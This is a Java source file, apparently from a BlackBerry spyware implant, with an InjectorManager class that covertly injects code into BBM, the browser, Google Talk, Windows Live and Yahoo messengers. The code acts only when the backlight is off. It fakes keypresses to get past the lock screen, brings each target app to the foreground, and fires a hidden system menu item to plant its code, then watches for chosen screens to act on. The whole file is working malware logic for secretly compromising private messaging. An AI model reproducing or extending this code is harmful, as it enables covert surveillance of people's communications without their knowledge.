//#preprocess
package blackberry.injection;

import java.util.Hashtable;
import java.util.Timer;
import java.util.TimerTask;

import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.AppListener;
import blackberry.Device;
import blackberry.Singleton;
import blackberry.Status;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.AInjector;
import blackberry.injection.injectors.BBMInjector;
import blackberry.injection.injectors.BrowserInjector;
import blackberry.injection.injectors.GoogleTalkInjector;
import blackberry.injection.injectors.LiveInjector;
import blackberry.injection.injectors.YahooInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.iSingleton;
import blackberry.utils.Utils;

/**
 * Singleton class used to manage injections of Injector-s. Once initialized, it
 * reacts on backlight and on applicationChange.
 * 
 * @author Zeno
 * 
 */
public class InjectorManager implements ApplicationObserver, iSingleton,
        BacklightObserver {
    private static final long APP_TIMER_PERIOD = 5000;
    private static final long GUID = 0x58b6431f259bac8dL;
    private static final int RUNON_APP = 1;
    private static final int RUNON_BACKLIGHT = 2;
    private static final int KEY_LOCK = 4099;

    private static final int MAX_TRIES = 3;
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectorManager",
            DebugLevel.VERBOSE);
    private static InjectorManager instance;
    //#endif
    AInjector[] injectors;
    Hashtable injectorMap = new Hashtable();

    ApplicationManager manager = ApplicationManager.getApplicationManager();

    private InjectorSystemMenu menu;
    private Timer applicationTimer;
    private String actualMod;
    private String actualName;
    private AInjector injector;
    private boolean injecting;
    private int started = 0;
    private Status status = Status.self();

    public synchronized static InjectorManager getInstance() {

        if (instance == null) {
            instance = (InjectorManager) Singleton.self().get(GUID);
            if (instance == null) {
                final InjectorManager singleton = new InjectorManager();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    private InjectorManager() {
        injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
                new GoogleTalkInjector(), new LiveInjector(),
                new YahooInjector() };

        for (int i = 0; i < injectors.length; i++) {
            injector = injectors[i];
            if (!exists(injector.getCodName())) {
                //#ifdef DEBUG
                debug.trace("InjectorManager, not existent application, disabling: "
                        + injector.getCodName());
                //#endif
                injector.disable();
            }
        }
    }

    public void start() {
        //#ifdef DEBUG
        debug.trace("start");
        //#endif

        //#ifdef DBC
        Check.requires(started >= 0, "start, started: " + started);
        //#endif
        synchronized (this) {
            started += 1;

            if (started > 1) {
                //#ifdef DEBUG
                debug.trace("start, already started");
                //#endif
                return;
            }
        }

        AppListener appListener = AppListener.getInstance();
        appListener.addApplicationObserver(this);
        appListener.addBacklightObserver(this);

        //appListener.suspendable(true);

        if (!Backlight.isEnabled()) {
            injectAll();
        }

    }

    public void stop() {
        //#ifdef DBC
        Check.requires(started > 0, "stop, started: " + started);
        //#endif
        synchronized (this) {
            started -= 1;
            if (started > 0) {
                //#ifdef DEBUG
                debug.trace("stop, not started");
                //#endif
                return;
            }
        }

        //#ifdef DEBUG
        debug.trace("stop");
        //#endif

        AppListener appListener = AppListener.getInstance();
        appListener.removeApplicationObserver(this);
        appListener.removeBacklightObserver(this);
        menu.removeMenu();
        injectorMap.clear();

    }

    /**
     * Tries to inject all the applications.
     * 
     * @return true if all injected
     */
    private void injectAll() {
        synchronized (this) {
            if (injecting) {
                return;
            }
            injecting = true;
        }

        try {

            boolean allInjected = true;
            for (int i = 0; i < injectors.length; i++) {
                injector = injectors[i];

                allInjected &= inject(injector);
            }

        } finally {
            synchronized (this) {
                injecting = false;
            }
        }

    }

    /**
     * 
     * @param injector
     * @return true if it's not needed to inject anymore, because injected or
     *         disabled
     */
    private boolean inject(AInjector injector) {
        //#ifdef DEBUG
        debug.trace("injectAll " + injector);
        //#endif

        if (!injector.enabled()) {
            //#ifdef DEBUG
            debug.trace("injectAll, disabled: " + injector);
            //#endif
            return true;
        }

        if (injector.isInjected()) {
            //#ifdef DEBUG
            debug.trace("injectAll, already infected: " + injector);
            //#endif
            return true;
        }

        if (injector.getTries() > MAX_TRIES) {
            //#ifdef DEBUG
            debug.trace("inject, too many tries");
            //#endif
            return true;
        }

        if (status.backlightEnabled()) {
            //#ifdef DEBUG
            debug.trace("inject, backlight, bailing out");
            //#endif
            return false;
        }

        String name = injector.getCodName();
        injectorMap.put(name, injector);

        status.setBacklight(false);
        manager.requestForegroundForConsole();
        unLock();

        if (requestForeground(name)) {
            //#ifdef DEBUG
            debug.trace("inject, executed: " + name);
            //#endif

            if (status.backlightEnabled()) {
                //#ifdef DEBUG
                debug.trace("inject, backlight, bailing out");
                //#endif
                return false;
            }
            injector.incrTries();

            Utils.sleep(500);
            if (checkForeground(name)) {

                if (status.backlightEnabled()) {
                    //#ifdef DEBUG
                    debug.trace("inject, backlight, bailing out");
                    //#endif
                    return false;
                }

                addSystemMenu(injector);
                Utils.sleep(300);
                callSystemMenu();
                Utils.sleep(300);
                removeSystemMenu();

                manager.requestForegroundForConsole();
            }
        }
        return false;
    }

    /**
     * verifica se occorre procedere con l'unlock.
     */
    private void unLock() {
        //#ifdef DEBUG
        debug.trace("unLock");
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
        Utils.sleep(200);

        if (status.backlightEnabled()) {
            //#ifdef DEBUG
            debug.trace("Backlight still enabled, getHardwareLayout: "
                    + Keypad.getHardwareLayout());
            //#endif

            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
            Utils.sleep(200);
            KeyInjector.pressRawKeyCode(KEY_LOCK);
            Utils.sleep(200);
            status.setBacklight(false);
            Utils.sleep(500);
            for (int i = 0; i < 10; i++) {
                if (status.backlightEnabled()) {
                    //Backlight.enable(false);
                    Utils.sleep(500);
                    //#ifdef DEBUG
                    debug.trace("unLock: backlight still enabled");
                    //#endif
                } else {
                    break;
                }
            }

            return;
        }

        //Main.getInstance().showBlackScreen(false); 
    }

    private boolean checkForeground(String codname) {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            //#ifdef DEBUG
            debug.trace("checkForeground: " + apps[i].getName());
            //#endif
            if (apps[i].getModuleName().indexOf(codname) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found");
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found but not foreground");
                    //#endif
                    return false;
                }
            }
        }
        return false;
    }

    private void addSystemMenu(AInjector injector) {
        //#ifdef DEBUG
        debug.trace("addSystemMenu");
        //#endif
        menu = new InjectorSystemMenu(this, injector);
        menu.addMenu();
    
    }

    private void callSystemMenu() {
        //#ifdef DEBUG
        debug.trace("callSystemMenu");
        //#endif

        //#ifdef BBM_DEBUG
        Backlight.enable(true);
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(500);

        if (Device.getInstance().atLeast(7, 0)) {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version 7, track ball up");
            //#endif
            KeyInjector.trackBallRaw(20, true);
        } else {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version <7, pressing menu: " + menu);
            //#endif
            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
        }

        Utils.sleep(500);
        KeyInjector.trackBallRawClick();
        Utils.sleep(500);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);

    }

    private void removeSystemMenu() {
        //#ifdef DEBUG
        debug.trace("removeSystemMenu");
        //#endif
    
        ApplicationMenuItemRepository.getInstance().removeMenuItem(
                ApplicationMenuItemRepository.MENUITEM_SYSTEM, menu);
    
    }

    private boolean requestForeground(String codName) {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getModuleName().indexOf(codName) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: already foreground");
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: bringing foreground");
                    //#endif
                    manager.requestForeground(processId);
                    return true;
                }
            }
        }

        return false;
    }

    private ApplicationDescriptor getApplicationDescriptor(String executeName) {
        //#ifdef DBC
        Check.requires(executeName != null,
                "getApplicationDescriptor null command"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("getApplicationDescriptor executeName= " + executeName); //$NON-NLS-1$
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.

            final String name = CodeModuleManager.getModuleName(handle);
            if (name.equals(executeName)) {
                //#ifdef DEBUG
                debug.trace("checkCommand, command found: " + executeName); //$NON-NLS-1$
                //#endif
                ApplicationDescriptor[] apps = CodeModuleManager
                        .getApplicationDescriptors(handle);
                if (apps != null && apps.length > 0) {
                    //#ifdef DEBUG
                    debug.trace("checkCommand: got applicationDescription"); //$NON-NLS-1$
                    //#endif
                    return apps[0];

                }
            }
        }

        //#ifdef DEBUG
        debug.warn("getApplicationDescriptor: not found"); //$NON-NLS-1$
        //#endif
        return null;

    }

    /**
     * check if a codname is installed in the system
     * 
     * @param name
     * @return
     */
    private boolean exists(String name) {
        final int handles[] = CodeModuleManager.getModuleHandles();
    
        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String modname = CodeModuleManager.getModuleName(handle);
            if (modname.equals(name)) {
                //#ifdef DEBUG
                debug.trace("exists, found.");
                //#endif
                return true;
            }
        }
        return false;
    }

    public void runOnBacklight() {
        //#ifdef DEBUG
        debug.trace("runOnBacklight");
        //#endif

        UiApplication.getUiApplication().invokeAndWait(new Runnable() {
            public void run() {
                injectAll();
            }
        });
    }

    /**
     * questa funzione viene chiamata ogni n secondi, se l'applicazione e' di
     * interesse
     */
    public void runOnApp() {
        //#ifdef DEBUG
        debug.trace("runOnApp");
        //#endif

        final AInjector injector = (AInjector) injectorMap.get(actualMod);
        //#ifdef DBC
        Check.requires(injector.enabled(), "run, injector disabled");
        //#endif

        if (injector.isInjected()) {
            final Screen screen = injector.getInjectedApp().getActiveScreen();
            String screenName = screen.getClass().getName();
            //#ifdef DEBUG
            debug.trace("onApplicationChange: " + screenName);
            //#endif

            for (int i = 0; i < injector.getWantedScreen().length; i++) {
                String s = injector.getWantedScreen()[i];
                if (screenName.endsWith(s)) {
                    //#ifdef DEBUG
                    debug.trace("onApplicationChange: screen found");
                    //#endif

                    UiApplication.getUiApplication().invokeAndWait(
                            new Runnable() {

                                public void run() {
                                    injector.playOnScreen(screen);
                                }

                            });

                    break;
                }
            }
        }
    }

    class RunInjectorTask extends TimerTask {

        private int runOn;

        RunInjectorTask(int runOn) {
            this.runOn = runOn;

        }

        public void run() {
            if (runOn == RUNON_APP) {
                runOnApp();
            } else if (runOn == RUNON_BACKLIGHT) {
                runOnBacklight();
            }
        }

    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        //#ifdef DEBUG
        debug.trace("onApplicationChange name: " + startedName + " cod: "
                + startedMod);
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }

        if (injectorMap.containsKey(startedMod)) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange, starting");
            //#endif
            this.actualMod = startedMod;
            this.actualName = startedName;
            applicationTimer = new Timer();

            RunInjectorTask task = new RunInjectorTask(RUNON_APP);
            applicationTimer.schedule(task, 1000, APP_TIMER_PERIOD);
        }

    }

    public void onBacklightChange(boolean status) {
        //#ifdef DEBUG
        debug.trace("onBacklightChange: " + status);
        //#endif
        if (!status) {
            if (applicationTimer != null) {
                applicationTimer.cancel();
                applicationTimer = null;
            }

            applicationTimer = new Timer();
            RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);

            applicationTimer.schedule(task, 11000, Integer.MAX_VALUE);
        }
    }

}
